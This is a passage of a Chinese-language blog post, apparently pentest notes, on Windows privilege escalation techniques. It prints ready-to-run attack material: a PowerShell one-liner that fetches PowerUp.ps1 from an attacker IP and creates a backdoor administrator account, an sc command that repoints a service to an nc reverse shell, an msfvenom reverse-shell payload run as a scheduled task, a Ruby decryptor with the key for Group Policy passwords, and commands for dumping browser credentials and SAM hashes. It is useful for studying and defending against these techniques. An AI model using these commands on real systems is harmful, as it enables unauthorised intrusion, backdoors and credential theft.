+<h4 id="不带引号的服务路径"><a href="#不带引号的服务路径" class="headerlink" title="不带引号的服务路径"></a>不带引号的服务路径</h4><p><strong>简介</strong><br>Windows的目录支持空格, 含有空格的目录被引用时安全的做法是用双引号闭合路径, 如果含有空格的路径未闭合windows将从左向右开始解析, 比如: <code>C:\Program File\360 service\av.exe</code>, windows将先后查找:<code>C:\Program.exe</code>、<code>C:\Program File\360.exe</code>、<code>C:\Program File\360 service\av.exe</code>, 一旦找到经运行对应的文件.<br>Windows下的服务一般以SYSTEM权限或Administrator权限运行, 当服务的程序路径(BINARY_PATH_NAME)中包含空格时, 如果对应的目录可写则可以向目录中写入对应的恶意程序, 然后手工重启服务或等待服务重启时运行恶意程序进行提权.</p>
+<p><strong>PowerUp Exp</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 运行下面的命令将从远程下载powerup.ps并在内存中运行, 然后在unquoted service的可利用目录下写入恶意程序创建管理员账号: backdoor/Password123!</span><br><span class="line">$ powershell.exe -nop -exec bypass &quot;IEX (New-Object Net.WebClient).DownloadString(&apos;http://&lt;attack&apos;s ip&gt;/PowerUp.ps1&apos;); Write-ServiceBinary -ServiceName &lt;target service name&gt; -Path &lt;target service unquoted path&gt; -UserName backdoor -Password Password123!&quot;</span><br></pre></td></tr></table></figure></p>
+<h4 id="不安全的服务权限"><a href="#不安全的服务权限" class="headerlink" title="不安全的服务权限"></a>不安全的服务权限</h4><p>该提权方法与<strong>不安全的注册表权限</strong>类似, 但此处不修改服务的<strong>ImagePath</strong>注册表值而是修改服务的属性。<br>为了检查服务权限是否有漏洞, 可下载微软提供的工具AccessChk, 这是Microsoft的Sysinternals Suite中的一个工具, 可以从<a href="http://technet.microsoft.com/en-us/sysinternals/bb842062.aspx" target="_blank" rel="noopener">here</a>下载。</p>
+<p>sc查看服务信息<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"># sc命令用于查询、配置和管理windows的服务</span><br><span class="line"></span><br><span class="line"><span class="function">C:\<span class="title">Windows</span>\<span class="title">system32</span>&gt; <span class="title">sc</span> <span class="title">qc</span> <span class="title">Spooler</span></span></span><br><span class="line"><span class="function">[<span class="title">SC</span>] <span class="title">QueryServiceConfig</span> <span class="title">SUCCESS</span></span></span><br><span class="line"><span class="function"><span class="title">SERVICE_NAME</span>: <span class="title">Spooler</span></span></span><br><span class="line"><span class="function">        <span class="title">TYPE</span>               : 110  <span class="title">WIN32_OWN_PROCESS</span> (<span class="title">interactive</span>)</span></span><br><span class="line"><span class="function">        <span class="title">START_TYPE</span>         : 2   <span class="title">AUTO_START</span></span></span><br><span class="line"><span class="function">        <span class="title">ERROR_CONTROL</span>      : 1   <span class="title">NORMAL</span></span></span><br><span class="line"><span class="function">        <span class="title">BINARY_PATH_NAME</span>   : <span class="title">C</span>:\<span class="title">Windows</span>\<span class="title">System32</span>\<span class="title">spoolsv.exe</span></span></span><br><span class="line"><span class="function">        <span class="title">LOAD_ORDER_GROUP</span>   : <span class="title">SpoolerGroup</span></span></span><br><span class="line"><span class="function">        <span class="title">TAG</span>                : 0</span></span><br><span class="line"><span class="function">        <span class="title">DISPLAY_NAME</span>       : <span class="title">Print</span> <span class="title">Spooler</span></span></span><br><span class="line"><span class="function">        <span class="title">DEPENDENCIES</span>       : <span class="title">RPCSS</span></span></span><br><span class="line"><span class="function">                           : <span class="title">http</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START_NAME</span> : <span class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure></p>
+<p>用accesschk.exe查看服务的权限<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># We can see the permissions that each user level has, you can also use "accesschk.exe -ucqv *" to list</span><br><span class="line">all services.</span><br><span class="line"></span><br><span class="line"><span class="function">C:\&gt; <span class="title">accesschk.exe</span> -<span class="title">ucqv</span> <span class="title">Spooler</span></span></span><br><span class="line"><span class="function"><span class="title">Spooler</span></span></span><br><span class="line"><span class="function">  <span class="title">R</span>  <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_STATUS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_CONFIG</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_INTERROGATE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ENUMERATE_DEPENDENTS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_USER_DEFINED_CONTROL</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">R</span>  <span class="title">BUILTIN</span>\<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_STATUS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_QUERY_CONFIG</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_INTERROGATE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ENUMERATE_DEPENDENTS</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_START</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_USER_DEFINED_CONTROL</span></span></span><br><span class="line"><span class="function">        <span class="title">READ_CONTROL</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure></p>
+<p>检查当前权限可操作的服务<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"># win10</span><br><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">b33f</span>\<span class="title">tools</span>\<span class="title">Sysinternals</span>&gt; <span class="title">accesschk.exe</span> -<span class="title">uwcqv</span> "<span class="title">Authenticated</span> <span class="title">Users</span>" *</span></span><br><span class="line"><span class="function"><span class="title">Accesschk</span> <span class="title">v6</span>.12 - <span class="title">Reports</span> <span class="title">effective</span> <span class="title">permissions</span> <span class="title">for</span> <span class="title">securable</span> <span class="title">objects</span></span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> (<span class="title">C</span>) 2006-2017 <span class="title">Mark</span> <span class="title">Russinovich</span></span></span><br><span class="line"><span class="function"><span class="title">Sysinternals</span> - <span class="title">www.sysinternals.com</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Error</span> <span class="title">opening</span> <span class="title">Authenticated</span> <span class="title">Users</span>:</span></span><br><span class="line"><span class="function">?????????</span></span><br><span class="line"><span class="function"><span class="title">No</span> <span class="title">matching</span> <span class="title">objects</span> <span class="title">found</span>.</span></span><br><span class="line"><span class="function"># <span class="title">win</span> <span class="title">xp</span> <span class="title">xp1</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">accesschk.exe</span> -<span class="title">uwcqv</span> "<span class="title">Authenticated</span> <span class="title">Users</span>" *</span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">SSDPSRV</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"><span class="title">RW</span> <span class="title">upnphost</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"># 查服务权限</span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">accesschk.exe</span> -<span class="title">ucqv</span> <span class="title">SSDPSRV</span></span></span><br><span class="line"><span class="function"><span class="title">SSDPSRV</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">LOCAL</span> <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">accesschk.exe</span> -<span class="title">ucqv</span> <span class="title">upnphost</span></span></span><br><span class="line"><span class="function"><span class="title">upnphost</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">SYSTEM</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Administrators</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">Authenticated</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">BUILTIN</span>\<span class="title">Power</span> <span class="title">Users</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br><span class="line"><span class="function">  <span class="title">RW</span> <span class="title">NT</span> <span class="title">AUTHORITY</span>\<span class="title">LOCAL</span> <span class="title">SERVICE</span></span></span><br><span class="line"><span class="function">        <span class="title">SERVICE_ALL_ACCESS</span></span></span><br></pre></td></tr></table></figure></p>
+<p>低权限用户可作为所有人权限操作服务的问题在XP SP2中被解决。该问题可作为通用的本地提权漏洞，通过重新配置服务，我们可以用SYSTEM权限运行指定的二进制文件。 eg:<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># 此处选择unpnhost服务，上面查出的两个服务中任一个均可</span><br><span class="line"></span><br><span class="line"># 查服务信息</span><br><span class="line">sc qc upnphost</span><br><span class="line"></span><br><span class="line"># 配置服务的binpath路径</span><br><span class="line">sc config upnphost binpath= "C:\nc.exe -nv <span class="number">127</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">1</span> <span class="number">9988</span> -e C:\WINDOWS\System32\<span class="built_in">cmd</span>.exe"</span><br><span class="line"></span><br><span class="line"># 修改服务的obj配置</span><br><span class="line">sc config upnphost obj= ".\LocalSystem" password= ""</span><br><span class="line"></span><br><span class="line"># 查询服务的配置</span><br><span class="line">sc qc upnphost</span><br><span class="line"></span><br><span class="line"># 重启服务</span><br><span class="line"><span class="built_in">net</span> <span class="built_in">start</span> upnphost</span><br></pre></td></tr></table></figure></p>
+<p>即使服务的权限配置不正确，我们也不总是拥有服务的完全访问权限。不同账号的权限如所示:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SERVICE_CHANGE_CONFIG   可以配置服务的二进制程序Can reconfigure the service binary</span><br><span class="line">WRITE_DAC               可以配置权限, leading to SERVICE_CHANGE_CONFIG</span><br><span class="line">WRITE_OWNER             可以成为所有者，配置权限</span><br><span class="line">GENERIC_WRITE           继承SERVICE_CHANGE_CONFIG的权限</span><br><span class="line">GENERIC_ALL             继承SERVICE_CHANGE_CONFIG的权限</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x22-dll"><a href="#0x22-dll" class="headerlink" title="0x22. dll"></a>0x22. dll</h3><p>常见的dll提权方式为DLL注入和DLL劫持，具体原理及利用手法后续研究和总结。</p>
+<h4 id="dll劫持"><a href="#dll劫持" class="headerlink" title="dll劫持"></a>dll劫持</h4><p>原理: 当windows应用动态加载动态链接库(dll)时, 如果没有指定完整路径名, windows将尝试搜索预定义的路径来定位待加载的dll。 如果攻击者可以控制预定义路径中的任何一个就有可能导致dll劫持。</p>
+<p>进程动态加载dll时, 系统会按如下顺序加载dll:</p>
+<ul>
+<li>应用程序加载的目录</li>
+<li>系统目录</li>
+<li>16位的系统目录</li>
+<li>windows目录</li>
+<li>当前目录</li>
+<li>PATH环境变量中列出的目录</li>
+</ul>
+<p>为了利用dll劫持, 我们需要:</p>
+<ul>
+<li>检查进程查找的dll是否存在与磁盘上</li>
+<li>如果不存在, 将恶意dll放置在上述任一目录中即可</li>
+<li>如果存在, 尝试将恶意dll放在更高优先级的目录中</li>
+</ul>
+<h4 id="2-dll注入"><a href="#2-dll注入" class="headerlink" title="2.dll注入"></a>2.dll注入</h4><p>待总结</p>
+<h3 id="0x23-注册表"><a href="#0x23-注册表" class="headerlink" title="0x23 注册表"></a>0x23 注册表</h3><p>WIndows下的注册表类似于windows系统的数据库，记载windows系统的配置并改变windows系统的行为；默认情况下，注册表的权限是安全的，但是，在企业中可能有各种原因导致需要修改注册表的权限来确保第权限的业务方操作对应的注册表内容，如果这个过程没有配置好权限就可能导致提权。<br>关于注册表提权的手法后续研究和总结。</p>
+<h3 id="0x24-计划任务-Administrator-to-SYSTEM"><a href="#0x24-计划任务-Administrator-to-SYSTEM" class="headerlink" title="0x24 计划任务(Administrator to SYSTEM)"></a>0x24 计划任务(Administrator to SYSTEM)</h3><p><strong>Tips</strong> 该方法仅使用与Windows 2000、XP或2003计算机, 必须拥有本地管理员权限才能管理计划任务, 因为计划任务的创建和修改必须使用管理员权限的账号, 如果是一个普通用户权限的账户或meterpreter会话则无法利用此方法提权。</p>
+<p>在Windows 2000、XP或2003计算机上，计划任务以SYSTEM权限运行, 这意味这如果我们创建一个执行恶意文件的计划任务, 恶意文件将以SYSTEM权限执行</p>
+<p>相关命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># msf创建反弹shell</span><br><span class="line">$ msgvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_na LHOST=&lt;your ip&gt; LPORT=&lt;your port&gt; -f exe -o Payload.exe</span><br><span class="line"></span><br><span class="line"># cmd命令开启计划任务(必须以管理员权限运行)</span><br><span class="line">$ net start &quot;Task Scheduler&quot;</span><br><span class="line"></span><br><span class="line"># 创建计划任务</span><br><span class="line">$ at 06:42 /interactive &quot;C:\Documents and Settings\test\Local Settings\Temp\Payload.exe&quot;</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x25-文件"><a href="#0x25-文件" class="headerlink" title="0x25. 文件"></a>0x25. 文件</h3><p>Windows，作为用户量最大的个人PC霸占着大部分企业的办公电脑系统，办公电脑中又经常保存开发环境、测试环境、生产环境的各种机器账号和密码；所以，对于文件中密钥的搜集是提权中重要且成本低的手法。<br>目前已经有大量的工具用于提取windows系统中文件中的密码，这些文件包括：浏览器的数据文件、远程控制工具的数据文件、组策略首选项文件、Windows密钥文件</p>
+<h4 id="从浏览器文件中提取凭证"><a href="#从浏览器文件中提取凭证" class="headerlink" title="从浏览器文件中提取凭证"></a>从浏览器文件中提取凭证</h4><p>chrome: <a href="https://github.com/hassaanaliw/chromepass" target="_blank" rel="noopener">chromepass</a><br>firefox: <a href="https://github.com/unode/firefox_decrypt" target="_blank" rel="noopener">firefox_decrypt</a></p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ python chromepass.py -d</span><br><span class="line">$ python firefox_decrypt.py</span><br></pre></td></tr></table></figure>
+<h4 id="从远控工具中提取凭证"><a href="#从远控工具中提取凭证" class="headerlink" title="从远控工具中提取凭证"></a>从远控工具中提取凭证</h4><p>PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP<a href="https://github.com/Arvanaghi/SessionGopher" target="_blank" rel="noopener">here</a>、mRemoteNG<a href="https://github.com/kmahyyg/mremoteng-decrypt" target="_blank" rel="noopener">here</a></p>
+<h4 id="组策略首选项文件"><a href="#组策略首选项文件" class="headerlink" title="组策略首选项文件"></a>组策略首选项文件</h4><p>在Windows域环境中, 有时需要从域控下发全局组策略在域内机器上执行, 这时候会用到SYSVOS的共享目录, 共享目录中存放用于执行组策略的账户和加密后的密钥. 该功能在Windows Server 2008中引入, 组策略首选项中指定的账户的凭证被加密存储在Groups.xml文件中, 密码为XML中的<strong>cpassword</strong>字段。常见组策略为难如下所示:</p>
+<ul>
+<li>Services\Services.xml</li>
+<li>ScheduledTasks\ScheduledTasks.xml</li>
+<li>Printers\Printers.xml</li>
+<li>Drives\Drives.xml</li>
+<li>DataSources\DataSources.xml</li>
+</ul>
+<p>微软公开了用于加密的公钥创建并被公开, 因此组策略中的密码可以被破解； 组策略中一般指定Administrator账号, 所以一旦破解便可以用管理员身份登陆主机实现提权。</p>
+<p>Groups.xml文件存储在共享文件中, 任何经过身份验证的用户都可以读取该文件, 因为访问该文件才能够进行组策略更新。 为了利用该问题, 需要寻找groups.xml文件的位置。<br>用于加密存储的公钥如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8</span><br><span class="line">f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b</span><br></pre></td></tr></table></figure></p>
+<p><strong>破解工具</strong><br><a href="http://www.sec-1.com/blog/wp-content/uploads/2015/05/gp3finder_v4.0.zip" target="_blank" rel="noopener">gp3finder</a><br><a href="http://www.twitter.com/carnal0wnage" target="_blank" rel="noopener">carnal0wnage</a>编写的ruby脚本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">require</span> <span class="string">'rubygems'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'openssl'</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'base64'</span></span><br><span class="line"> </span><br><span class="line">encrypted_data = <span class="string">"j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw"</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(encrypted_data)</span></span></span><br><span class="line">padding = <span class="string">"="</span> * (<span class="number">4</span> - (encrypted_data.length % <span class="number">4</span>))</span><br><span class="line">epassword = <span class="string">"<span class="subst">#&#123;encrypted_data&#125;</span><span class="subst">#&#123;padding&#125;</span>"</span></span><br><span class="line">decoded = Base64.decode64(epassword)</span><br><span class="line"> </span><br><span class="line">key = <span class="string">"\x4e\x99\x06\xe8\xfc\xb6\x6c\xc9\xfa\xf4\x93\x10\x62\</span></span><br><span class="line"><span class="string">x0f\xfe\xe8\xf4\x96\xe8\x06\xcc\x05\x79\x90\x20\x9b\x09\xa4\</span></span><br><span class="line"><span class="string">x33\xb6\x6c\x1b"</span></span><br><span class="line">aes = OpenSSL::Cipher::Cipher.new(<span class="string">"AES-256-CBC"</span>)</span><br><span class="line">aes.decrypt</span><br><span class="line">aes.key = key</span><br><span class="line">plaintext = aes.update(decoded)</span><br><span class="line">plaintext &lt;&lt; aes.final</span><br><span class="line">pass = plaintext.unpack(<span class="string">'v*'</span>).pack(<span class="string">'C*'</span>) <span class="comment"># UNICODE conversion </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">return</span> pass</span><br><span class="line"><span class="keyword">end</span> </span><br><span class="line"> </span><br><span class="line">blah = decrypt(encrypted_data)</span><br><span class="line">puts blah</span><br></pre></td></tr></table></figure></p>
+<p><a href="post/windows/gather/credentials/gpp">metasploit</a></p>
+<p><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerShplit</a><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ Get-CachedGPPPassword //For locally stored GP Files</span><br></pre></td></tr></table></figure></p>
+<h4 id="Windows密钥文件"><a href="#Windows密钥文件" class="headerlink" title="Windows密钥文件"></a>Windows密钥文件</h4><p>Windows系统的账号密码保存在C:/Windows/System32/config目录下的SYSTEM、SAM文件中，通过samdump2可以将密钥提取出来。<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ samdump2 SYSTEM SAM -o /tmp/ntlm_hash.txt</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x26-错误配置"><a href="#0x26-错误配置" class="headerlink" title="0x26 错误配置"></a>0x26 错误配置</h3><p>Windows系统的复杂性导致了出现错误配置的可能行，该部分对系统的错误配置可能导致提权的方法进行研究和总结。</p>
+<h4 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h4><p>该配置译为总是以高权限安装，在Windows 2000及以上可用；该配置作用于通过windows installer安装的应用程序，如果指了AlwaysInstallElevalted, 则普通用户安装应用程序文件时，将以本地系统管理员(NT AUTHORITY\SYSTEM)的权限进行安装，可安装提权msi程序进行提权。该配置默认为未配置，微软<strong>强烈建议</strong>不要开启此配置，所以请关闭此配置。<br>查看该配置状态的方法：</p>
+<ol>
+<li><p>打开cmd运行gpedit.msc，在”计算机配置(Computer Configuration)” - “管理模版(Administrative Templates)” - “windows组件(Windows Components)” - “Windows Installer”中可以找到”永远以高权限进行安装(Always install with elevated)”，右键选中”属性”即可看到当前配置<br><img src="alwaysinstallelasted_gpedit.png" alt="gpedit"></p>
+</li>
+<li><p>查注册表”HKEY_CURRENT_USER”和”HKEY_LOCAL_MACHINE”中的”Software” - “Policies” - “Microsoft” - “Windows” - “Installer”下是否有”EnableAdminTSRemote”键，如果存在且值不等于0则可以提权；否则无法提权。<br><img src="alwaysinstallelasted_regedit.png" alt="regedit"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># This will only work if both registry keys contain &quot;AlwaysInstallElevated&quot; with DWORD values of 1.</span><br><span class="line"></span><br><span class="line">C:\Windows\system32&gt; reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br><span class="line">C:\Windows\system32&gt; reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<h4 id="参考文章-1"><a href="#参考文章-1" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="http://secvue.com/using-powerup-with-unquoted-service-paths/" target="_blank" rel="noopener">using-powerup-with-unquoted-service-paths</a><br><a href="https://www.gracefulsecurity.com/privesc-unquoted-service-path/" target="_blank" rel="noopener">privesc-unquoted-service-path</a><br>youtube - Windows Privilege Escalation<br><a href="https://pentestlab.blog/tag/cpassword/" target="_blank" rel="noopener">Group Policy Preferences</a><br><a href="https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1" target="_blank" rel="noopener">PowerUp</a><br><a href="https://www.hackingarticles.in/windows-privilege-escalation-alwaysinstallelevated/" target="_blank" rel="noopener">windows-privilege-escalation-alwaysinstallelevated</a><br><a href="https://www.fuzzysecurity.com/tutorials/16.html" target="_blank" rel="noopener">Windows渗透资料</a><br><a href="http://synjunkie.blogspot.com/2008/03/command-line-ninjitsu.html" target="_blank" rel="noopener">Ninjitsu</a><br><a href="http://www.computerhope.com/wmic.htm" target="_blank" rel="noopener">Ninjitsu</a><br><a href="https://www.fuzzysecurity.com/tutorials/files/wmic_info.rar" target="_blank" rel="noopener">wmic_info.bat</a><br><a href="https://www.fuzzysecurity.com/tutorials/files/Win7.html" target="_blank" rel="noopener">Badly patched</a><br><a href="https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/" target="_blank" rel="noopener">Windows Privilege Escalation Methods for Pentesters</a><br><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md" target="_blank" rel="noopener">Windows - Privilege Escalation</a><br><a href="https://medium.com/@rahmatnurfauzi/windows-privilege-escalation-scripts-techniques-30fa37bd194" target="_blank" rel="noopener">tools</a><br><a href="https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/" target="_blank" rel="noopener">Windows Privilege Escalation Guide</a><br><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/my-5-top-ways-to-escalate-privileges/" target="_blank" rel="noopener">my-5-top-ways-to-escalate-privileges</a><br><a href="https://azeria-labs.com/privilege-escalation/" target="_blank" rel="noopener">escalate-privilege-with-cve</a><br><a href="https://adsecurity.org/?p=3658" target="_blank" rel="noopener">域用户组详解</a></p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/MS-Sql/" rel="tag"># MS-Sql</a>
+          
+            <a href="/tags/信息收集/" rel="tag"># 信息收集</a>
+          
+            <a href="/tags/pass-the-hash/" rel="tag"># pass the hash</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/22/hacktools-for-windows/" rel="next" title="hacktools for windows">
+                <i class="fa fa-chevron-left"></i> hacktools for windows
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/24/how-get-a-reverse-shell/" rel="prev" title="how get a reverse shell">
+                how get a reverse shell <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
